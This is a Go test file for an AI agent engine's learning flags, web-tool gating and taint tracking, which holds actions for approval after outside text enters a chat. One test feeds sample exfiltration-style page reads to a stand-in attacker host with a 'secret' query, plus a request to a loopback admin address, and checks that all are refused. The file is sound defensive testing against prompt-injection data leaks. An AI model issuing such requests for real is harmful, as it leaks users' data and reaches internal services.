package chat

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"sync"
	"testing"
	"time"
)

// Phase 3 on the agent engine: learning and web flags in run.start, Go's gate
// verdicts for the web tools, and the timely web backend's searches and page
// reads (web.go, engine_learning.go), against the fake worker.

// chatWith is chat with the row edited before it is queued.
func (h *engineHarness) chatWith(text, permission, fixture string, jsonl []byte, edit func(*Conversation)) Conversation {
	h.t.Helper()
	c := Conversation{ID: id("chat_"), UserID: "user-a", Title: "Agent", Status: "queued", Phase: "plan", Engine: engineAgent,
		Permission: permission, Provider: "openrouter", Model: "stub-model", Client: "web", Context: []ContextChip{},
		Messages: []Message{message("user", text)}, Plan: []Step{}, Snapshots: []Snapshot{}, Transcript: []WireMessage{}}
	if edit != nil {
		edit(&c)
	}
	h.kit.Fixture(fixture, jsonl).ForConversation(c.ID, fixture)
	if err := h.db.Create(&c).Error; err != nil {
		h.t.Fatal(err)
	}
	return c
}

// idleChat is a finished chat of user-a that no lane claims.
func (h *engineHarness) idleChat(edit func(*Conversation)) Conversation {
	h.t.Helper()
	c := Conversation{ID: id("chat_"), UserID: "user-a", Title: "Earlier", Status: "idle", Phase: "plan", Context: []ContextChip{},
		Messages: []Message{message("user", "earlier")}, Plan: []Step{}, Snapshots: []Snapshot{}, Transcript: []WireMessage{}}
	edit(&c)
	if err := h.db.Create(&c).Error; err != nil {
		h.t.Fatal(err)
	}
	return c
}

// runStart is the run.start the fake received for conversation cid.
type runStartFields struct {
	Run      string   `json:"run"`
	Conv     string   `json:"conversation_id"`
	Toolsets []string `json:"toolsets"`
	Flags    struct {
		Sensitive      bool `json:"sensitive"`
		AnswerOnly     bool `json:"answer_only"`
		Web            bool `json:"web"`
		LearningWrites bool `json:"learning_writes"`
		SearchHistory  bool `json:"search_history"`
		FromBot        bool `json:"from_bot"`
	} `json:"flags"`
	TaintedConversations []string `json:"tainted_conversations"`
	SearchExclude        []string `json:"search_exclude"`
	SearchAllow          []string `json:"search_allow"`
	PersonHosts          []string `json:"person_hosts"`
	PersonLinks          []string `json:"person_links"`
	UserMessage          string   `json:"user_message"`
	PrivateContext       []string `json:"private_context"`
}

func (h *engineHarness) runStart(cid string) runStartFields {
	h.t.Helper()
	for _, r := range h.kit.ReceivedOf("run.start") {
		var start runStartFields
		if err := r.Decode(&start); err != nil {
			h.t.Fatal(err)
		}
		if start.Conv == cid {
			return start
		}
	}
	h.t.Fatalf("no run.start for %s", cid)
	return runStartFields{}
}

func learningOn(context.Context, string) (LearningPrefs, error) {
	return LearningPrefs{Learning: true, SearchHistory: true}, nil
}

// run.start carries the learning and web flags, the toolsets they open, the
// account's tainted and "Don't learn" chats and the hosts the person typed;
// the reply names its run (agentRun).
func TestIntegrationAgentEngineRunStartCarriesLearningAndWeb(t *testing.T) {
	h := newEngineHarness(t)
	h.e.opts.Learning = learningOn
	tainted := h.idleChat(func(c *Conversation) {
		c.TaintedSources = TaintSources{{Kind: "web", Tool: "web_extract", Host: "example.net"}}
	})
	quiet := h.idleChat(func(c *Conversation) { c.NoLearning = true })
	private := h.idleChat(func(c *Conversation) { c.Sensitive = true })
	clean := h.idleChat(func(*Conversation) {})
	c := h.chatWith("Compare https://shop.example.org/p and news.example.com for me", "supervised", "flags", lines(reply("Done.", 0)),
		func(c *Conversation) { c.WebSearch = true })
	c = h.wait(c.ID, "replied", statusIs("idle"))
	start := h.runStart(c.ID)
	f := start.Flags
	if !f.LearningWrites || !f.SearchHistory || !f.Web || f.Sensitive || f.AnswerOnly || f.FromBot {
		t.Fatalf("flags %+v", f)
	}
	if want := []string{"timely", "todo", "skills", "memory", "session_search", "web"}; !slices.Equal(start.Toolsets, want) {
		t.Fatalf("toolsets %v, want %v", start.Toolsets, want)
	}
	if !slices.Equal(start.TaintedConversations, []string{tainted.ID}) {
		t.Fatalf("tainted_conversations %v, want only %s (not %s)", start.TaintedConversations, tainted.ID, clean.ID)
	}
	if !slices.Equal(start.SearchExclude, []string{quiet.ID}) {
		t.Fatalf("search_exclude %v, want %s", start.SearchExclude, quiet.ID)
	}
	if !slices.Equal(start.PersonHosts, []string{"news.example.com", "shop.example.org"}) {
		t.Fatalf("person_hosts %v", start.PersonHosts)
	}
	// The pages the person typed: after taint the worker opens these, a
	// search's results and front pages, on every web backend.
	if !slices.Equal(start.PersonLinks, []string{"shop.example.org/p"}) {
		t.Fatalf("person_links %v", start.PersonLinks)
	}
	// Past-chat search may return the account's chats only, never a
	// Sensitive or "Don't learn" one: a session state.db holds without a
	// chat (restored, deleted) is not on the list, so it is never a hit.
	allow := slices.Clone(start.SearchAllow)
	slices.Sort(allow)
	want := []string{tainted.ID, clean.ID, c.ID}
	slices.Sort(want)
	if !slices.Equal(allow, want) || slices.Contains(allow, quiet.ID) || slices.Contains(allow, private.ID) {
		t.Fatalf("search_allow %v, want %v", start.SearchAllow, want)
	}
	// private_context is Timely's part of the message (attached context,
	// get_context), never the person's own words.
	if len(start.PrivateContext) == 0 {
		t.Fatal("run.start has no private_context")
	}
	for _, part := range start.PrivateContext {
		if strings.Contains(part, "Compare https://shop.example.org/p") || strings.HasPrefix(part, "System notice (not written by the user):\nCurrent UTC time") {
			t.Fatalf("private_context carries %q", part)
		}
		if !strings.Contains(start.UserMessage, part) {
			t.Fatalf("private part %q is not in user_message", part)
		}
	}
	var block struct {
		SystemText string `json:"system_text"`
	}
	for _, r := range h.kit.ReceivedOf("run.start") {
		_ = r.Decode(&block)
	}
	if !strings.Contains(block.SystemText, webSearchOn) {
		t.Fatal("a run with the web lacks the web search line in its Timely block")
	}
	if got := lastMessage(c); got.AgentRun != start.Run || got.Engine != engineAgent {
		t.Fatalf("reply agentRun %q engine %q, want run %q", got.AgentRun, got.Engine, start.Run)
	}
}

// "Don't learn from this chat" (PATCH noLearning) sends learning_writes
// false and no memory or past-chat search, lists the chat in search_exclude,
// and shows in the chat's JSON; without the learning switches (nil) learning
// is off too.
func TestIntegrationAgentEngineNoLearningChat(t *testing.T) {
	h := newEngineHarness(t)
	h.e.opts.Learning = learningOn
	c := h.chatWith("Hello", "supervised", "quiet", lines(reply("Hi.", 0)), nil)
	// The first run learns; the person then turns learning off for the chat,
	// and the next message's run does not.
	h.wait(c.ID, "replied", statusIs("idle"))
	// The learning pass of that first run may still be going: the worker
	// is told at once, so it writes nothing more.
	stopped := make(chan [2]string, 2)
	h.s.SetStopLearning(func(uid, cid string) { stopped <- [2]string{uid, cid} })
	code, body := serve(t, h.s, "PATCH", "/chats/"+c.ID, `{"noLearning":true}`)
	var patched map[string]any
	if code != 200 || json.Unmarshal(body, &patched) != nil || patched["noLearning"] != true {
		t.Fatalf("PATCH noLearning: %d %s", code, body)
	}
	select {
	case got := <-stopped:
		if got != [2]string{c.UserID, c.ID} {
			t.Fatalf("stopped learning for %v", got)
		}
	case <-time.After(5 * time.Second):
		t.Fatal("Don't learn from this chat did not reach the worker")
	}
	code, body = serve(t, h.s, "GET", "/chats", "")
	if code != 200 || !strings.Contains(string(body), `"noLearning":true`) {
		t.Fatalf("GET /chats does not show noLearning: %d %s", code, body)
	}
	code, body = serve(t, h.s, "POST", "/chats/"+c.ID+"/messages", `{"content":"And again"}`)
	if code != 200 {
		t.Fatalf("send: %d %s", code, body)
	}
	h.wait(c.ID, "replied again", func(c Conversation) bool { return c.Status == "idle" && len(c.Messages) >= 4 })
	starts := h.kit.ReceivedOf("run.start")
	if len(starts) != 2 {
		t.Fatalf("%d run.starts", len(starts))
	}
	var first, second runStartFields
	_ = starts[0].Decode(&first)
	_ = starts[1].Decode(&second)
	if !first.Flags.LearningWrites || !slices.Contains(first.Toolsets, "memory") {
		t.Fatalf("first run (learning on): %+v %v", first.Flags, first.Toolsets)
	}
	if second.Flags.LearningWrites || second.Flags.SearchHistory || slices.Contains(second.Toolsets, "memory") || slices.Contains(second.Toolsets, "session_search") {
		t.Fatalf("no_learning run: %+v %v", second.Flags, second.Toolsets)
	}
	if !slices.Contains(second.SearchExclude, c.ID) {
		t.Fatalf("search_exclude %v lacks the chat", second.SearchExclude)
	}

	h.e.opts.Learning = nil
	off := h.chatWith("Hello", "supervised", "off", lines(reply("Hi.", 0)), nil)
	h.wait(off.ID, "replied", statusIs("idle"))
	if s := h.runStart(off.ID); s.Flags.LearningWrites || s.Flags.SearchHistory || !slices.Equal(s.Toolsets, chatToolsets) {
		t.Fatalf("learning without switches: %+v %v", s.Flags, s.Toolsets)
	}
}

// Each case of runSetup's flags, read from the chat's own row and the
// account's switches.
func TestIntegrationAgentEngineRunSetupFlags(t *testing.T) {
	h := newEngineHarness(t)
	ctx := context.Background()
	for _, tc := range []struct {
		name                 string
		prefs                LearningPrefs
		edit                 func(*Conversation)
		answerOnly           bool
		learn, search, webOn bool
		toolsets             []string
	}{
		{name: "all on", prefs: LearningPrefs{true, true}, edit: func(c *Conversation) { c.WebSearch = true }, learn: true, search: true, webOn: true,
			toolsets: []string{"timely", "todo", "skills", "memory", "session_search", "web"}},
		{name: "search history off", prefs: LearningPrefs{true, false}, learn: true, toolsets: []string{"timely", "todo", "skills", "memory"}},
		{name: "learning off keeps search off", prefs: LearningPrefs{false, true}, edit: func(c *Conversation) { c.WebSearch = true }, webOn: true,
			toolsets: []string{"timely", "todo", "skills", "web"}},
		{name: "no_learning", prefs: LearningPrefs{true, true}, edit: func(c *Conversation) { c.NoLearning = true }, toolsets: chatToolsets},
		{name: "sensitive", prefs: LearningPrefs{true, true}, edit: func(c *Conversation) { c.Sensitive, c.WebSearch = true, true }, toolsets: chatToolsets},
		{name: "answer-only", prefs: LearningPrefs{true, true}, edit: func(c *Conversation) { c.WebSearch = true }, answerOnly: true, toolsets: chatToolsets},
	} {
		t.Run(tc.name, func(t *testing.T) {
			h.e.opts.Learning = func(context.Context, string) (LearningPrefs, error) { return tc.prefs, nil }
			c := &Conversation{UserID: "user-a", Messages: []Message{message("user", "hi")}}
			if tc.edit != nil {
				tc.edit(c)
			}
			tools := &toolRun{answerOnly: tc.answerOnly}
			got := h.e.runSetup(ctx, c, tools)
			if got.learningWrites != tc.learn || got.searchHistory != tc.search || tools.web.on != tc.webOn || !slices.Equal(got.toolsets, tc.toolsets) {
				t.Fatalf("learn %v search %v web %v toolsets %v", got.learningWrites, got.searchHistory, tools.web.on, got.toolsets)
			}
			verdict, message := gateVerdict(tools, "web_extract")
			if tc.webOn != (verdict == "allow") || (!tc.webOn && message != webOff) {
				t.Fatalf("web_extract verdict %s %q", verdict, message)
			}
		})
	}
}

// gate.ask: the web tools are allowed while the run has the web and
// blocked with "Web search is off in this chat" otherwise; every other tool
// keeps phase 2's block.
func TestIntegrationAgentEngineGateVerdicts(t *testing.T) {
	h := newEngineHarness(t)
	ask := func(callID, tool string) obj {
		return obj{"type": "gate.ask", "tool_call_id": callID, "tool": tool, "args": obj{}, "tainted_sources": []TaintSource{}, "run_kind": "chat"}
	}
	script := lines(ask("g1", "web_search"), ask("g2", "web_extract"), ask("g3", "terminal"), reply("Done.", 0))
	on := h.chatWith("Look it up", "supervised", "gate-on", script, func(c *Conversation) { c.WebSearch = true })
	h.wait(on.ID, "replied", statusIs("idle"))
	off := h.chatWith("Look it up", "supervised", "gate-off", script, nil)
	h.wait(off.ID, "replied", statusIs("idle"))
	var verdicts []string
	for _, r := range h.kit.ReceivedOf("gate.verdict") {
		var v struct {
			Verdict string `json:"verdict"`
			Message string `json:"message"`
		}
		_ = r.Decode(&v)
		verdicts = append(verdicts, v.Verdict+": "+v.Message)
	}
	want := []string{"allow: ", "allow: ", "block: " + gateBlocked, "block: " + webOff, "block: " + webOff, "block: " + gateBlocked}
	if !slices.Equal(verdicts, want) {
		t.Fatalf("verdicts\n%q\nwant\n%q", verdicts, want)
	}
}

// A web_extract through the timely backend (a page from the fixture
// fetcher, outside) followed by a direct=true proposal in Auto waits for
// Approve with nothing written: Go records the page's host as the chat's
// taint itself, whatever the worker reports.
func TestIntegrationAgentEngineWebExtractHoldsADirectProposal(t *testing.T) {
	h := newEngineHarness(t)
	dir := t.TempDir()
	if err := os.MkdirAll(filepath.Join(dir, "news"), 0o755); err != nil {
		t.Fatal(err)
	}
	page := "<html><head><title>Milk prices</title></head><body><p>Milk costs less this week.</p></body></html>"
	if err := os.WriteFile(filepath.Join(dir, "news", "index.html"), []byte(page), 0o644); err != nil {
		t.Fatal(err)
	}
	h.e.opts.Fetch = FixtureFetcher(dir)
	c := h.chatWith("Read the news page, then add Buy milk", "auto", "extract-then-propose", lines(
		toolCallLine("call_x", "web_extract", obj{"urls": []string{"https://news.fixture.invalid/"}}, 1),
		toolCallLine("call_p", "propose_changes", buyMilk(true), 1),
		reply("I drafted the change.", 0),
	), func(c *Conversation) { c.WebSearch = true })
	c = h.wait(c.ID, "held the proposal", ended)
	if c.Status != "approval" || items(h.db) != 0 {
		t.Fatalf("status %s, %d items: the proposal after a page read applied", c.Status, items(h.db))
	}
	if want := (TaintSource{Kind: "web", Tool: "web_extract", Host: "news.fixture.invalid"}); !slices.Contains(c.TaintedSources, want) {
		t.Fatalf("tainted_sources %+v", c.TaintedSources)
	}
	results := h.toolResults()
	if len(results) != 2 || !results[0].Outside || !strings.Contains(string(results[0].Result), "Milk costs less this week.") ||
		!strings.Contains(string(results[0].Result), `"title":"Milk prices"`) {
		t.Fatalf("web_extract result %+v", results)
	}
	if proposal := latestProposal(c.Messages); proposal == nil || proposal.AgentRun == "" || proposal.AgentRun != h.runStart(c.ID).Run {
		t.Fatalf("proposal agentRun: %+v", proposal)
	}
}

// fakeSearch is a run's Completer for the web_search tests.
type fakeSearch struct {
	mu       sync.Mutex
	can      bool
	answer   WireMessage
	searches []string
}

func (f *fakeSearch) Complete(_ context.Context, messages []WireMessage, _ []any, search bool) (WireMessage, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	if search {
		f.searches = append(f.searches, messages[len(messages)-1].Content)
	}
	return f.answer, nil
}

func (f *fakeSearch) CanSearch() bool { return f.can }

type searchCompleters struct{ c Completer }

func (s searchCompleters) Resolve(context.Context, string) (string, string, error) {
	return "openrouter", "stub-model", nil
}

func (s searchCompleters) Completer(context.Context, string, string, string) (Completer, error) {
	return s.c, nil
}

// web_search through the timely backend searches with the run's provider and
// answers its citations as results (outside); a provider without search
// answers that web search needs a key, and nothing is searched.
func TestIntegrationAgentEngineWebSearchUsesTheChatProvider(t *testing.T) {
	citation, _ := json.Marshal(obj{"type": "url_citation", "url_citation": obj{"url": "https://dairy.example.com/prices", "title": "Dairy prices", "content": "Milk is 1.10"}})
	searching := &fakeSearch{can: true, answer: WireMessage{Role: "assistant", Content: "Milk is cheaper ([report](https://news.example.org/milk)).",
		Annotations: []json.RawMessage{citation}}}
	plain := &fakeSearch{can: false, answer: WireMessage{Role: "assistant", Content: "unused"}}
	for _, tc := range []struct {
		name string
		c    *fakeSearch
	}{{"searching provider", searching}, {"provider without search", plain}} {
		t.Run(tc.name, func(t *testing.T) {
			h := newEngineHarness(t)
			h.s.SetCompleters(searchCompleters{tc.c})
			c := h.chatWith("What does milk cost?", "supervised", "search", lines(
				toolCallLine("call_s", "web_search", obj{"query": "milk price", "limit": 5}, 1),
				reply("Milk is cheaper.", 0),
			), func(c *Conversation) { c.WebSearch = true })
			c = h.wait(c.ID, "replied", statusIs("idle"))
			results := h.toolResults()
			if len(results) != 1 {
				t.Fatalf("tool.results %+v", results)
			}
			var got struct {
				Answer  string      `json:"answer"`
				Results []webResult `json:"results"`
				Error   string      `json:"error"`
			}
			_ = json.Unmarshal(results[0].Result, &got)
			if !tc.c.can {
				if got.Error != needsSearchKey || results[0].Outside || len(tc.c.searches) != 0 {
					t.Fatalf("a provider without search: %+v outside %v, %d searches", got, results[0].Outside, len(tc.c.searches))
				}
				if len(c.TaintedSources) != 0 {
					t.Fatalf("no search, yet tainted: %+v", c.TaintedSources)
				}
				return
			}
			// The citation is the only result: the link in the answer text
			// is the search model's writing, in a clean run's first search too.
			want := []webResult{{URL: "https://dairy.example.com/prices", Title: "Dairy prices", Description: "Milk is 1.10"}}
			if !results[0].Outside || got.Answer != searching.answer.Content || !slices.Equal(got.Results, want) {
				t.Fatalf("search result %+v outside %v", got, results[0].Outside)
			}
			if len(searching.searches) != 1 || !strings.HasPrefix(searching.searches[0], "milk price") {
				t.Fatalf("searches %q", searching.searches)
			}
			if !slices.Contains(c.TaintedSources, TaintSource{Kind: "web", Tool: "web_search"}) {
				t.Fatalf("tainted_sources %+v", c.TaintedSources)
			}
		})
	}
}

// After outside text reached a chat, a page read is refused unless the
// person typed its site or a search of the run returned it; a private
// address is refused always. Nothing refused reaches the fetcher.
func TestIntegrationAgentEngineWebExtractSecondLine(t *testing.T) {
	h := newEngineHarness(t)
	var mu sync.Mutex
	var fetched []string
	h.e.opts.Fetch = func(_ context.Context, rawURL string) (Page, error) {
		mu.Lock()
		fetched = append(fetched, rawURL)
		mu.Unlock()
		return Page{URL: rawURL, Title: "Page", Content: "page text"}, nil
	}
	// The run is tainted when it searches: only the citation is a result,
	// not the link the search model wrote in its text.
	citation, _ := json.Marshal(obj{"type": "url_citation", "url_citation": obj{"url": "https://found.example.net/a", "title": "Found"}})
	searching := &fakeSearch{can: true, answer: WireMessage{Role: "assistant", Content: "See https://found.example.net/a and https://written.example.org/x",
		Annotations: []json.RawMessage{citation}}}
	h.s.SetCompleters(searchCompleters{searching})
	extract := func(callID, link string) obj {
		return toolCallLine(callID, "web_extract", obj{"urls": []string{link}}, 1)
	}
	c := h.chatWith("Check typed.example.com please", "supervised", "second-line", lines(
		extract("x1", "http://127.0.0.1/admin"),
		extract("x2", "https://typed.example.com/"),
		extract("x3", "https://attacker.example/?q=secret"),
		toolCallLine("s1", "web_search", obj{"query": "found"}, 1),
		extract("x4", "https://found.example.net/a"),
		extract("x5", "https://found.example.net/b"),
		extract("x6", "https://found.example.net/b?q=secret"),
		extract("x7", "https://found.example.net/"),
		extract("x8", "https://typed.example.com/log/ivf-consult-okonkwo"),
		extract("x9", "https://written.example.org/x"),
		reply("Done.", 0),
	), func(c *Conversation) { c.WebSearch = true })
	h.wait(c.ID, "replied", statusIs("idle"))
	var pageErrors []string
	for i, r := range h.toolResults() {
		if i == 3 {
			continue // the search
		}
		var body struct {
			Pages []webPage `json:"pages"`
		}
		_ = json.Unmarshal(r.Result, &body)
		if len(body.Pages) != 1 {
			t.Fatalf("result %d: %s", i, r.Result)
		}
		pageErrors = append(pageErrors, body.Pages[0].Error)
	}
	// After taint a path no search returned and the person did not type
	// could carry their data to the site: only front pages and exact
	// results open.
	want := []string{notPublic, "", pasteLink, "", pasteLink, pasteLink, "", pasteLink, pasteLink}
	if !slices.Equal(pageErrors, want) {
		t.Fatalf("page errors\n%q\nwant\n%q", pageErrors, want)
	}
	if !slices.Equal(fetched, []string{"https://typed.example.com/", "https://found.example.net/a", "https://found.example.net/"}) {
		t.Fatalf("fetched %q", fetched)
	}
}

// Taint the worker reports only in a gate.ask (a keyed backend's
// web_extract, or a past-chat search hit from a chat with outside text:
// {kind: session}) taints the run at once: a page path on a site the person
// typed no longer opens, and a later direct proposal in Auto waits for
// Approve, though neither tool.call carries the taint.
func TestIntegrationAgentEngineGateAskTaintHoldsADirectProposal(t *testing.T) {
	h := newEngineHarness(t)
	var fetched []string
	var mu sync.Mutex
	h.e.opts.Fetch = func(_ context.Context, rawURL string) (Page, error) {
		mu.Lock()
		fetched = append(fetched, rawURL)
		mu.Unlock()
		return Page{URL: rawURL, Title: "Page", Content: "page text"}, nil
	}
	session := TaintSource{Kind: "session", Tool: "session_search", Session: "chat_old"}
	c := h.chatWith("Find what I said before about typed.example.com, then add Buy milk", "auto", "gate-taint", lines(
		obj{"type": "gate.ask", "tool_call_id": "g1", "tool": "web_search", "args": obj{}, "tainted_sources": []TaintSource{session}, "run_kind": "chat"},
		toolCallLine("call_x", "web_extract", obj{"urls": []string{"https://typed.example.com/log/what-i-said"}}, 1),
		toolCallLine("call_p", "propose_changes", buyMilk(true), 1),
		reply("I drafted the change.", 0),
	), func(c *Conversation) { c.WebSearch = true })
	c = h.wait(c.ID, "held the proposal", ended)
	if c.Status != "approval" || items(h.db) != 0 {
		t.Fatalf("status %s, %d items: the proposal after a tainted search applied", c.Status, items(h.db))
	}
	if !slices.Contains(c.TaintedSources, session) {
		t.Fatalf("tainted_sources %+v", c.TaintedSources)
	}
	mu.Lock()
	defer mu.Unlock()
	if len(fetched) != 0 {
		t.Fatalf("a tainted run opened %q", fetched)
	}
	var body struct {
		Pages []webPage `json:"pages"`
	}
	if results := h.toolResults(); len(results) == 0 || json.Unmarshal(results[0].Result, &body) != nil || len(body.Pages) != 1 || body.Pages[0].Error != pasteLink {
		t.Fatalf("web_extract after gate.ask taint: %+v", body)
	}
}
